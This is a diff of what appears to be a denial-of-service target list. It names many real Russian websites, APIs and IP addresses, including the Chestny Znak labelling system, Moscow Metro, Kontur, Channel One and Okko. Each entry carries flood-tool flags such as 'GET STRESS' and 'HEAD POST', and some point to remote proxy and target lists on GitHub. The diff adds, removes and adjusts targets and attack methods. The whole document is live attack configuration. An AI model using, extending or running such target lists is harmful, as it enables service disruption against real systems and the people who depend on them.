@@ -1,3 +1,5 @@
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://edo-gismt.crpt.ru/ https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru http://suz2.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ https://апи.национальный-каталог.рф/ https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/v3/feed-product?apikey=6A9769C235F432 https://suzgrid.crpt.ru:16443/api/v2/integration/connection https://nrz.api.mdlp.crpt.ru tcp://91.230.251.101:443 --http-methods HEAD POST
+
 http://nnoblsud.ru https://mosmetro.ru https://job.mosmetro.ru https://mis.mosmetro.ru/login.php https://app-bucket.mosmetro.ru https://shop.mosmetro.ru https://mcd.mosmetro.ru https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/ https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://focus-api.kontur.ru/ https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/ https://edi-api.kontur.ru https://evrika.kontur.ru --http-methods GET STRESS
 
 https://www.1tv.ru/live  https://cm.1tv.ru/  tcp://81.177.156.250:80 tcp://81.177.156.250:443 https://tlxmob.1tv.ru/  https://25.1tv.ru/  https://kino.1tv.ru/  https://users.1tv.ru/  http://edu.1tv.ru/  https://admin.kino.1tv.ru/  tcp://178.248.238.75:80 tcp://178.248.238.75:443 https://stage.1tv.ru/ tcp://81.177.156.195:25 tcp://81.177.156.195:443 https://subscr.1tv.ru/ --http-methods GET STRESS --proxies https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies/proxy.txt
@@ -6,11 +8,7 @@ https://www.1tv.ru/live  https://cm.1tv.ru/  tcp://81.177.156.250:80 tcp://81.17
 
 https://okko.tv https://aeroflotbonus.okko.tv https://cabinet.okko.tv/login https://www.agent.okko.tv/ https://agents.okko.tv https://premiere.okko.tv/ https://show.okko.tv https://mimimi.okko.team/ https://pobeda.okko.tv https://www.ontvtime.ru https://www.amediateka.ru https://kodiki.amediateka.ru/ https://localandroid.amediateka.ru/ https://bbb.amediateka.ru/b https://rt.amediateka.ru/ https://akado.amediateka.ru/ https://wink.ru https://www.kartina.tv https://www.debilizator.tv https://www.glaz.tv/online-tv/ --http-methods GET STRESS
 
-https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru https://support.crpt.ru/Login/SspLogin.aspx?ReturnUrl=%2F http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ tcp://82.202.190.166:443 --http-methods GET STRESS
-
--c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET STRESS
-
-https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru https://support.crpt.ru/Login/SspLogin.aspx?ReturnUrl=%2F http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ tcp://82.202.190.166:443 --http-methods GET STRESS
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods HEAD POST
 
 https://vetrf.ru/ https://idp.vetrf.ru/idp/profile/SAML2/POST/SSO?execution=e1s1 https://duma.vetrf.ru/ https://vesta.vetrf.ru/ https://accounts.vetrf.ru https://cerberus.vetrf.ru/cerberus/ https://ecert.vetrf.ru https://help.vetrf.ru/wiki/ https://t2-idp.vetrf.ru/idp/ https://t2-aplms.vetrf.ru/pub/ --http-methods GET STRESS
 
@@ -46,11 +44,11 @@ https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-
 
 -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods HEAD POST
 
--c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods HEAD POST
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/api_auto_mila --http-methods GET
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/api_auto_mila --http-methods HEAD POST
 
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
 
